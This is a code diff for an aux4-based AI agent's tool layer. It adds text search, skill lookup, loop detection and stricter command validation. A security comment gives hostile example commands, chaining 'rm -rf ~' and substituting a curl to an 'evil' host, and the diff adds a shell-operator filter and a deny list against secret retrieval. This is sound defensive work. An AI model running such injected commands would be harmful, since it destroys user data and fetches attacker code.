@@ -24,7 +24,9 @@ import askUserDesc from "../docs/tools/askUser.md?raw";
 import currentDateTimeDesc from "../docs/tools/currentDateTime.md?raw";
 import readReferenceDesc from "../docs/tools/readReference.md?raw";
 import readSkillDesc from "../docs/tools/readSkill.md?raw";
-import { listSkills } from "./Skills.js";
+import searchTextDesc from "../docs/tools/searchText.md?raw";
+import aux4SkillDesc from "../docs/tools/aux4Skill.md?raw";
+import { listSkills, listInstalledSkills } from "./Skills.js";
 
 // Array to track files and directories created by the agent
 const createdPaths = [];
@@ -410,7 +412,7 @@ function executeWithTimeout(cmd, { stdin, timeout, cwd } = {}) {
       if (fullSize > MAX_OUTPUT_LENGTH) {
         // Keep stdout file so the agent can read the full output; only clean stderr
         cleanupTempFiles(null, stderrPath);
-        resolve(stdout + `\n\n[Output truncated: ${fullSize} bytes total. Full output was written to ${stdoutPath}]`);
+        resolve(stdout + `\n\n[Output truncated: ${fullSize} bytes total. The full output is at ${stdoutPath} -- use searchText on that file to find the part you need, or readFile with an offset.]`);
       } else {
         cleanupTempFiles(stdoutPath, stderrPath);
         resolve(stdout);
@@ -435,12 +437,21 @@ function readOutputFile(filePath, maxBytes) {
     if (stat.size <= maxBytes) {
       return fs.readFileSync(filePath, "utf-8");
     }
-    // Read the last maxBytes
+    // Keep BOTH ends. Reading only the tail is right for a log but wrong for the most common
+    // case -- `<command> --help`, where the command list is at the top. Dropping the head left
+    // the model with trailing flag defaults and no idea which subcommands exist.
+    const headBytes = Math.floor(maxBytes * 0.6);
+    const tailBytes = maxBytes - headBytes;
     const fd = fs.openSync(filePath, "r");
-    const buffer = Buffer.alloc(maxBytes);
-    fs.readSync(fd, buffer, 0, maxBytes, stat.size - maxBytes);
+    const head = Buffer.alloc(headBytes);
+    fs.readSync(fd, head, 0, headBytes, 0);
+    const tail = Buffer.alloc(tailBytes);
+    fs.readSync(fd, tail, 0, tailBytes, stat.size - tailBytes);
     fs.closeSync(fd);
-    return "[...truncated...]\n" + buffer.toString("utf-8");
+    const omitted = stat.size - maxBytes;
+    return head.toString("utf-8")
+      + `\n\n[...${omitted} bytes omitted...]\n\n`
+      + tail.toString("utf-8");
   } catch {
     return "";
   }
@@ -499,16 +510,22 @@ function formatTimeoutMessage(command, timeout, error) {
 }
 
 export const executeAux4CliTool = tool(
-  async ({ command, stdin, timeout, cwd }) => {
+  async ({ command: rawCommand, stdin, timeout, cwd }) => {
+    const command = toStrippedForm(rawCommand);
+    const fullCommand = toFullForm(rawCommand);
+
+    const invalid = validateAux4Only(fullCommand);
+    if (invalid) return invalid;
+
     // Check system-level deny first (cannot be overridden)
     for (const pattern of SYSTEM_DENY) {
-      if (matchesPattern(command, pattern)) {
+      if (matchesPattern(command, pattern) || matchesPattern(fullCommand, pattern)) {
         return `Permission denied: command "${command}" is blocked by system security policy. Direct secret access is not allowed. Instead, declare a variable with the secret:// notation in your command's .aux4 definition, and aux4 will resolve it automatically at runtime.\n\nFormat: secret://<provider>/<vault>/<item>/<field>\nOTP:    secret://<provider>/<vault>/<item>/otp\n\nExample variable in .aux4:\n  { "name": "apiKey", "default": "secret://1password/dev/my-api/credential" }\n  { "name": "totpCode", "default": "secret://1password/dev/my-api/otp" }\n\nThe secret is resolved securely and injected into the variable — never call secret get directly.`;
       }
     }
 
     try {
-      const result = await executeWithTimeout(`aux4 ${command}`, { stdin, timeout, cwd });
+      const result = await executeWithTimeout(fullCommand, { stdin, timeout, cwd });
       return result;
     } catch (error) {
       if (error.timedOut) {
@@ -580,20 +597,115 @@ export function checkPermission(subject, permissions = {}) {
 // System-level deny list — always blocked, cannot be overridden by config
 const SYSTEM_DENY = ["secret*get*", "jobs run*op *", "jobs run*secret*get*"];
 
+// A bare "not allowed" is a dead end: the caller has no way to know whether the whole task is
+// impossible or it simply reached for the wrong command. Observed on a machine with several
+// similarly-named packages installed — an agent asked to email a calendar entry found the
+// plausible `aux4 calendar`, was denied, and concluded it was blocked, without ever trying the
+// `aux4 google calendar` it was allowed to use.
+//
+// Listing the allow-list turns the denial into a redirection. Deny rules are deliberately not
+// echoed: a caller only needs to know where it may go, and a deny list is the more sensitive half
+// of the config.
+const ALLOWED_HINT_LIMIT = 30;
+
+function allowedHint(permissions) {
+  const allow = (permissions && permissions.allow) || [];
+  if (allow.length === 0) {
+    return "";
+  }
+
+  // Collapse the `cmd` / `cmd *` pairs most configs contain into one entry each, so the hint
+  // stays readable at a glance.
+  const seen = new Set();
+  for (const pattern of allow) {
+    const base = String(pattern).replace(/\s*\*+$/, "").trim();
+    if (base !== "") {
+      seen.add(base);
+    }
+  }
+
+  // A wildcard-only allow list (`["*"]`) strips to nothing: there is no specific command to
+  // point at, and "you may run anything" is not a useful redirection when the denial came from
+  // a deny rule. Say nothing rather than emit an empty list.
+  const commands = [...seen];
+  if (commands.length === 0) {
+    return "";
+  }
+
+  const shown = commands.slice(0, ALLOWED_HINT_LIMIT);
+  const rest = commands.length - shown.length;
+  const more = rest > 0 ? `, and ${rest} more` : "";
+
+  return ` Commands you may run: ${shown.join(", ")}${more}. Use one of these instead — the task is not necessarily impossible, you may simply have reached for a command that is not permitted here.`;
+}
+
 // Factory that wraps executeAux4 with permission checking
+// `aux4 X` reads as "auxiliary for X", so `aux4 aux4 pkger ...` is auxiliary-for-aux4 and
+// is NOT redundant. Models write the command exactly as it is typed in a terminal (full
+// form) — that matches the man pages and their pretraining, and removes the "did I already
+// say aux4?" ambiguity that made models either drop or double the prefix. The older
+// stripped form (no leading `aux4`) is still accepted so existing agents keep working.
+function toFullForm(command) {
+  const trimmed = (command || "").trim();
+  return /^aux4(\s|$)/.test(trimmed) ? trimmed : `aux4 ${trimmed}`;
+}
+
+function toStrippedForm(command) {
+  const trimmed = (command || "").trim();
+  return trimmed.replace(/^aux4(\s+|$)/, "");
+}
+
+// executeAux4 runs ONLY aux4 commands — never arbitrary CLI. Commands are executed via
+// `sh -c`, so shell control operators would let a caller chain any binary
+// (`aux4 version; rm -rf ~`) or substitute one (`aux4 $(curl evil)`). Reject them: this is
+// the boundary that makes an aux4-only tool safer than a general bash tool.
+const SHELL_CONTROL = /[;&|`\n\r]|\$\(|\$\{|<\(|>|</;
+
+function validateAux4Only(fullCommand) {
+  if (!/^aux4(\s|$)/.test(fullCommand)) {
+    return `Permission denied: executeAux4 runs only aux4 commands, and "${fullCommand}" is not one.`;
+  }
+  if (SHELL_CONTROL.test(fullCommand)) {
+    return `Permission denied: executeAux4 runs only a single aux4 command. Shell operators (; && || | \` $() redirects) are not allowed — run one aux4 command per call.`;
+  }
+  return null;
+}
+
 export const createExecuteAux4Tool = (permissions) => tool(
-  async ({ command, stdin, timeout, cwd }) => {
-    // Check system-level deny first (cannot be overridden)
+  async ({ command: rawCommand, stdin, timeout, cwd }) => {
+    // Full-command form: the model writes the command exactly as typed in a terminal,
+    // including the leading `aux4` ("aux4 X" = auxiliary for X, so `aux4 aux4 pkger ...`
+    // is auxiliary-for-aux4). Legacy stripped form (no leading `aux4`) still works.
+    const command = toStrippedForm(rawCommand);
+    const fullCommand = toFullForm(rawCommand);
+
+    const invalid = validateAux4Only(fullCommand);
+    if (invalid) return invalid;
+
+    // Check system-level deny first (cannot be overridden). Match BOTH forms so a deny
+    // rule written either way still blocks.
     for (const pattern of SYSTEM_DENY) {
-      if (matchesPattern(command, pattern)) {
+      if (matchesPattern(command, pattern) || matchesPattern(fullCommand, pattern)) {
         return `Permission denied: command "${command}" is blocked by system security policy. Direct secret access is not allowed. Instead, declare a variable with the secret:// notation in your command's .aux4 definition, and aux4 will resolve it automatically at runtime.\n\nFormat: secret://<provider>/<vault>/<item>/<field>\nOTP:    secret://<provider>/<vault>/<item>/otp\n\nExample variable in .aux4:\n  { "name": "apiKey", "default": "secret://1password/dev/my-api/credential" }\n  { "name": "totpCode", "default": "secret://1password/dev/my-api/otp" }\n\nThe secret is resolved securely and injected into the variable — never call secret get directly.`;
       }
     }
 
-    const decision = checkPermission(command, permissions);
+    // Permission patterns may be written in either form (stripped, as agents configured
+    // them before; or full, matching what actually runs). Deny wins if EITHER form is
+    // denied; allow needs only one form to match, so existing configs keep working.
+    const strippedDecision = checkPermission(command, permissions);
+    const fullDecision = checkPermission(fullCommand, permissions);
+    const decision =
+      strippedDecision === "deny" && fullDecision === "deny"
+        ? "deny"
+        : strippedDecision === "allow" || fullDecision === "allow"
+          ? "allow"
+          : strippedDecision === "ask" || fullDecision === "ask"
+            ? "ask"
+            : "deny";
 
     if (decision === "deny") {
-      return `Permission denied: command "${command}" is not allowed by the permissions configuration.`;
+      return `Permission denied: command "${fullCommand}" is not allowed by the permissions configuration.${allowedHint(permissions)}`;
     }
 
     if (decision === "ask") {
@@ -626,7 +738,7 @@ export const createExecuteAux4Tool = (permissions) => tool(
     }
 
     try {
-      const result = await executeWithTimeout(`aux4 ${command}`, { stdin, timeout, cwd });
+      const result = await executeWithTimeout(fullCommand, { stdin, timeout, cwd });
       return result;
     } catch (error) {
       if (error.timedOut) {
@@ -1293,41 +1405,55 @@ export const currentDateTimeTool = tool(
   }
 );
 
-export const createReadReferenceTool = (referencesDir) => tool(
+// ai-agent's own built-in references (detailed tool how-tos), shipped in the
+// package at instructions/references. The bundle is CJS, so __dirname resolves
+// to package/lib at runtime; the references sit one level up.
+const BUILTIN_REFERENCES_DIR = path.join(__dirname, "..", "instructions", "references");
+
+export const createReadReferenceTool = (referencesDir, builtinDir = BUILTIN_REFERENCES_DIR) => tool(
   async ({ file }) => {
     try {
-      if (!referencesDir) {
-        return "No references directory configured.";
+      // Resolution order: the configured references dir first, then ai-agent's
+      // built-in references. This lets callers override a reference while the
+      // internal tool how-tos are always available on demand.
+      const dirs = [];
+      if (referencesDir && fs.existsSync(path.resolve(referencesDir))) {
+        dirs.push(path.resolve(referencesDir));
       }
-
-      const resolvedDir = path.resolve(referencesDir);
-
-      if (!fs.existsSync(resolvedDir)) {
-        return "References directory not found.";
+      if (builtinDir && fs.existsSync(path.resolve(builtinDir))) {
+        dirs.push(path.resolve(builtinDir));
+      }
+      if (dirs.length === 0) {
+        return "No references available.";
       }
 
       if (!file) {
-        const files = [];
-        function walk(dir) {
-          for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
-            const full = path.join(dir, entry.name);
-            if (entry.isDirectory()) {
-              walk(full);
-            } else if (entry.name.endsWith(".md")) {
-              files.push(path.relative(resolvedDir, full));
+        const seen = new Set();
+        for (const dir of dirs) {
+          function walk(base, current) {
+            for (const entry of fs.readdirSync(current, { withFileTypes: true })) {
+              const full = path.join(current, entry.name);
+              if (entry.isDirectory()) {
+                walk(base, full);
+              } else if (entry.name.endsWith(".md")) {
+                seen.add(path.relative(base, full));
+              }
             }
           }
+          walk(dir, dir);
         }
-        walk(resolvedDir);
-        if (files.length === 0) return "No reference documents found.";
-        return files.join("\n");
+        if (seen.size === 0) return "No reference documents found.";
+        return [...seen].sort().join("\n");
       }
 
-      const filePath = path.resolve(resolvedDir, file);
-      if (!filePath.startsWith(resolvedDir)) return "Access denied";
-      if (!fs.existsSync(filePath)) return `Reference "${file}" not found.`;
-
-      return fs.readFileSync(filePath, { encoding: "utf-8" });
+      for (const dir of dirs) {
+        const filePath = path.resolve(dir, file);
+        if (!filePath.startsWith(dir)) continue; // path traversal guard
+        if (fs.existsSync(filePath)) {
+          return fs.readFileSync(filePath, { encoding: "utf-8" });
+        }
+      }
+      return `Reference "${file}" not found.`;
     } catch (e) {
       return e.message;
     }
@@ -1374,6 +1500,127 @@ export const createReadSkillTool = (skillsDir) => tool(
     description: readSkillDesc,
     schema: z.object({
       skill: z.string().optional().describe("The skill name to read. Omit to list available skills.")
+    })
+  }
+);
+
+// Installed aux4 skills are packages discovered through the CLI, not SKILL.md files in a
+// directory -- readSkill covers the latter. Reading a skill on demand keeps its instructions
+// (often thousands of tokens) out of every request.
+export const aux4SkillTool = tool(
+  async ({ skill }) => {
+    try {
+      if (!skill) {
+        const skills = listInstalledSkills();
+        if (skills.length === 0) return "No skills installed.";
+        // An index reads as though the skill has been consulted, and callers stop here -- then
+        // run commands without the method they just listed. Say plainly that this is not it.
+        return "These are the names of the installed skills. This is an index only -- it does not"
+          + " contain any method. If one of them covers your task, read it before running anything"
+          + " for it, by calling this tool again with that name.\n\n"
+          + skills.map(s => `${s.name} - ${s.description}`).join("\n");
+      }
+
+      if (!/^[a-zA-Z0-9][a-zA-Z0-9:_-]*$/.test(skill)) {
+        return `Invalid skill name "${skill}".`;
+      }
+
+      const result = spawnSync("aux4", ["ai", "skill", skill, "prompt"], {
+        encoding: "utf-8",
+        timeout: 30000
+      });
+
+      if (result.error) return result.error.message;
+      if (result.status !== 0) {
+        return `Skill "${skill}" not found. Call this tool with no arguments to list installed skills.`;
+      }
+
+      return result.stdout.trim();
+    } catch (e) {
+      return e.message;
+    }
+  },
+  {
+    name: "aux4Skill",
+    description: aux4SkillDesc,
+    schema: z.object({
+      skill: z.string().optional().describe("The skill name to read. Omit to list installed skills.")
+    })
+  }
+);
+
+
+// Rank passages WITHIN one file. Truncated output already names the file it was written to, but
+// paging blindly through 12KB to find one section is worse than asking for it. Indexing happens
+// per call on a single file, so there is no corpus to build or keep fresh.
+export const createSearchTextTool = (permissions) => tool(
+  async ({ file, query, limit = 5 }) => {
+    try {
+      const filePath = path.resolve(expandTildePath(file));
+      const currentDirectory = process.cwd();
+      if (!isReadOnlyPathAllowed(filePath, currentDirectory)) return "Access denied";
+      const denied = await checkFileAccess("read", filePath, permissions);
+      if (denied) return denied;
+      if (!fs.existsSync(filePath)) return "File not found";
+
+      const content = fs.readFileSync(filePath, { encoding: "utf-8" });
+      const lines = content.split("\n");
+
+      // Passages are blank-line separated blocks, which for help output and logs lines up with
+      // one section each. A block that never breaks falls back to fixed windows.
+      const passages = [];
+      let start = 0, buf = [];
+      const flush = () => {
+        if (buf.length && buf.join("").trim()) passages.push({ line: start + 1, text: buf.join("\n") });
+        buf = [];
+      };
+      lines.forEach((ln, i) => {
+        if (buf.length === 0) start = i;
+        if (ln.trim() === "") { flush(); } else {
+          buf.push(ln);
+          if (buf.length >= 40) flush();
+        }
+      });
+      flush();
+      if (passages.length === 0) return "File is empty";
+
+      const norm = t => t.toLowerCase().match(/[a-z0-9_.-]+/g) || [];
+      const terms = norm(query);
+      if (terms.length === 0) return "Empty query";
+
+      const docs = passages.map(p => norm(p.text));
+      const avgLen = docs.reduce((a, d) => a + d.length, 0) / docs.length;
+      const df = {};
+      for (const t of new Set(terms)) df[t] = docs.filter(d => d.includes(t)).length;
+
+      const K1 = 1.5, B = 0.75;
+      const scored = passages.map((p, i) => {
+        const d = docs[i];
+        let score = 0;
+        for (const t of terms) {
+          const n = df[t];
+          if (!n) continue;
+          const f = d.filter(w => w === t).length;
+          if (!f) continue;
+          const idf = Math.log(1 + (docs.length - n + 0.5) / (n + 0.5));
+          score += idf * (f * (K1 + 1)) / (f + K1 * (1 - B + B * (d.length / avgLen)));
+        }
+        return { ...p, score };
+      }).filter(p => p.score > 0).sort((a, b) => b.score - a.score).slice(0, limit);
+
+      if (scored.length === 0) return `No passage in ${file} matches "${query}".`;
+      return scored.map(p => `[line ${p.line}]\n${p.text}`).join("\n\n");
+    } catch (e) {
+      return e.message;
+    }
+  },
+  {
+    name: "searchText",
+    description: searchTextDesc,
+    schema: z.object({
+      file: z.string().describe("Path to the file to search, e.g. the path from a truncation message"),
+      query: z.string().describe("What you are looking for, in plain words"),
+      limit: z.number().optional().describe("Maximum passages to return. Defaults to 5.")
     })
   }
 );
@@ -1500,6 +1747,69 @@ export const searchContextTool = createSearchContextTool();
 // supplied by getUsage). On deny the underlying tool never runs and the model gets a
 // short adaptive message. Every decision is recorded on the policy so Prompt can
 // attach it to the history `tool` entry when --history is set.
+// An agent that repeats the same call and gets the same answer is not making progress, and
+// nothing in the loop notices: a model can burn its whole budget re-running four calls. Compare
+// the ARGUMENTS AND THE RESULT -- a repeated call whose result changes is legitimate (polling),
+// a repeated call whose result does not is stuck. On the third identical pair, say so instead of
+// running it again.
+const LOOP_REPEAT_LIMIT = 3;
+// How many refusals of the SAME call before the run is aborted outright.
+const LOOP_ABORT_AFTER = 3;
+
+function wrapWithLoopDetection(name, underlyingTool) {
+  const seen = new Map();
+
+  return tool(
+    async (args) => {
+      const cleanArgs = { ...args };
+      delete cleanArgs.__policyCallId;
+      // Volatile identifiers defeat the comparison: a browser daemon restart yields a new
+      // session id, so an agent repeating the identical journey looks like all-new calls.
+      // Normalise them out so the key describes what is being done, not which handle it used.
+      const key = JSON.stringify(cleanArgs)
+        .replace(/--session[= ]+[A-Za-z0-9-]+/g, "--session <id>")
+        .replace(/"sessionId"\s*:\s*"[^"]*"/g, '"sessionId":"<id>"');
+      const prior = seen.get(key);
+
+      if (prior && prior.count >= LOOP_REPEAT_LIMIT - 1) {
+        prior.blocked = (prior.blocked || 0) + 1;
+        seen.set(key, prior);
+
+        // Refusing is not enough on its own: a model that ignores the refusal simply re-issues
+        // the call, and each refusal is appended to the history and replayed on every later
+        // request. One unbounded run reached 624 calls and 26M input tokens that way -- the
+        // detector generating the waste it exists to prevent. After a few refusals, stop.
+        if (prior.blocked >= LOOP_ABORT_AFTER) {
+          const err = new Error(
+            `Aborting: the same call has been refused ${prior.blocked} times and keeps being repeated. `
+            + `The agent is not making progress and each attempt grows the context. Last result was:\n`
+            + String(prior.result).slice(0, 200)
+          );
+          err.loopAbort = true;
+          throw err;
+        }
+
+        const sample = String(prior.result).slice(0, 200);
+        return `Not run: you have already made this exact call ${prior.count} times and it returned`
+          + ` the same result every time:\n${sample}\n\nRepeating it will not change anything.`
+          + ` Read the current state and take a different route, or stop and report what is blocking you.`;
+      }
+
+      const result = await underlyingTool.invoke(args);
+      const asText = String(result);
+      seen.set(key, prior && prior.result === asText
+        ? { count: prior.count + 1, result: asText }
+        : { count: 1, result: asText });
+      return result;
+    },
+    {
+      name,
+      description: underlyingTool.description || (underlyingTool.lc_kwargs && underlyingTool.lc_kwargs.description) || name,
+      schema: underlyingTool.schema
+    }
+  );
+}
+
 function wrapWithPolicy(name, underlyingTool, policy, getUsage) {
   if (!policy) return underlyingTool;
 
@@ -1529,7 +1839,7 @@ function wrapWithPolicy(name, underlyingTool, policy, getUsage) {
 }
 
 export function createTools(config = {}) {
-  const { storage, embeddingsConfig, permissions, references, skills, policy, getUsage } = config;
+  const { storage, embeddingsConfig, permissions, references, skills, policy, getUsage, tools } = config;
 
   const base = {
     readFile: permissions ? createReadFileTool(permissions) : readLocalFileTool,
@@ -1545,16 +1855,35 @@ export function createTools(config = {}) {
     askUser: createAskUserTool(),
     currentDateTime: currentDateTimeTool,
     readReference: createReadReferenceTool(references),
-    readSkill: createReadSkillTool(skills)
+    readSkill: createReadSkillTool(skills),
+    searchText: createSearchTextTool(permissions),
+    aux4Skill: aux4SkillTool
   };
 
-  if (!policy) return base;
-
-  // Gate only the consequential tools; read-only tools stay exempt.
-  const CONSEQUENTIAL = ["executeAux4", "writeFile", "editFile", "removeFiles", "createDirectory", "saveImage"];
-  for (const name of CONSEQUENTIAL) {
-    base[name] = wrapWithPolicy(name, base[name], policy, getUsage);
+  if (policy) {
+    // Gate only the consequential tools; read-only tools stay exempt.
+    const CONSEQUENTIAL = ["executeAux4", "writeFile", "editFile", "removeFiles", "createDirectory", "saveImage"];
+    for (const name of CONSEQUENTIAL) {
+      base[name] = wrapWithPolicy(name, base[name], policy, getUsage);
+    }
   }
+
+  // Loop detection wraps every bound tool: a stuck agent repeats any of them, not just the
+  // consequential ones.
+  for (const name of Object.keys(base)) {
+    base[name] = wrapWithLoopDetection(name, base[name]);
+  }
+
+  // Optional allow-list: bind only the named tools. Shrinks the per-request tool-description
+  // floor (each unbound tool's schema is not sent to the model). Unknown names are ignored.
+  if (Array.isArray(tools) && tools.length > 0) {
+    const selected = {};
+    for (const name of tools) {
+      if (base[name]) selected[name] = base[name];
+    }
+    return Object.keys(selected).length > 0 ? selected : base;
+  }
+
   return base;
 }
 
